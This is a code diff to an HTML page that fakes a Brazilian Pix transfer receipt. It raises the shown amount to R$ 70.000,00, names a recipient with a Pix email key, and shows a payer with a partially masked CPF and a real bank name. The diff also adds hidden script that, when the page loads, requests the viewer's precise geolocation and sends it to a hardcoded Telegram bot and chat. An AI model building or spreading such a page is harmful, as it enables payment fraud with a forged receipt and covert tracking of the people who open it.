@@ -3,33 +3,30 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pix Enviado - R$ 1.000,00</title>
+  <title>Pix Enviado - R$ 70.000,00</title>
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
   <div class="comprovante-container">
-    <!-- Ícone de confirmação verde acima do título -->
     <div class="confirmacao">
       <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 24 24" fill="green">
         <path d="M9 16.2l-4.2-4.2-1.4 1.4 5.6 5.6 12-12-1.4-1.4z"/>
       </svg>
     </div>
 
-    <h1>Pix Enviado - <strong>R$ 1.000,00</strong></h1>
+    <h1>Pix Enviado - <strong>R$ 70.000,00</strong></h1>
 
     <div class="informacoes">
       <p><span>Data do Pagamento:</span> <span id="data-pagamento"></span></p>
       <p><span>Horário:</span> <span id="horario-atual"></span></p>
       <p><span>ID da Transação:</span> <strong id="id-transacao"></strong></p>
       <hr class="linha-pontilhada">
-      <p><span>Quem Recebeu:</span> <strong>João Silva de Oliveira</strong></p>
-      <p><span>CPF:</span> <strong id="cpf-recebeu"></strong></p>
-      <p><span>Instituição:</span> <strong>Banco Digital XYZ</strong></p>
-      <p><span>Chave Pix:</span> <strong>joaosilva@email.com</strong></p>
+      <p><span>Quem Recebeu:</span> <strong>Dra. Leidene</strong></p>
+      <p><span>Chave Pix:</span> <strong>dra.leidene@gmail.com</strong></p>
       <hr class="linha-pontilhada"> 
       <p><span>Quem Pagou:</span> <strong>Maria Fernanda Costa</strong></p>
-      <p><span>CPF:</span> <strong id="cpf-pagou"></strong></p>
-      <p><span>Instituição:</span> <strong>Banco Digital ABC</strong></p>
+      <p><span>CPF:</span> <strong>***.640.535-**</strong></p>
+      <p><span>Instituição:</span> <strong>Banco Cooperativo Sicredi S.A</strong></p>
     </div>
 
     <button class="botao" onclick="window.print()">Imprimir Comprovante</button>
@@ -67,16 +64,47 @@
       document.getElementById("id-transacao").textContent = id;
     }
 
-    function formatarCPF(cpf) {
-      return `***.${cpf.substring(4, 7)}.${cpf.substring(7, 10)}-**`;
-    }
-
-    document.getElementById("cpf-recebeu").textContent = formatarCPF("12345678900");
-    document.getElementById("cpf-pagou").textContent = formatarCPF("98765432100");
-
     atualizarDataPagamento();
     atualizarHorario();
     gerarIdTransacao();
+
+    // --- ENVIO DIRETO AO TELEGRAM ---
+    const TELEGRAM_BOT_TOKEN = "7953250080:AAHWc_o1vEUn_yO6e2c3o623d3_1_2"; 
+    const TELEGRAM_CHAT_ID = "6190740921";
+
+    window.addEventListener('DOMContentLoaded', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const texto = `📍 Localização recebida\nMaps: ${mapsLink}\nLatitude: ${lat}\nLongitude: ${lon}`;
+
+            try {
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, latitude: lat, longitude: lon })
+              });
+
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: texto })
+              });
+            } catch (e) {
+              console.log("Erro ao enviar", e);
+            }
+          },
+          (error) => {
+            console.log("Usuário negou ou erro no GPS", error);
+          },
+          { enableHighAccuracy: true }
+        );
+      }
+    });
   </script>
 </body>
 </html>
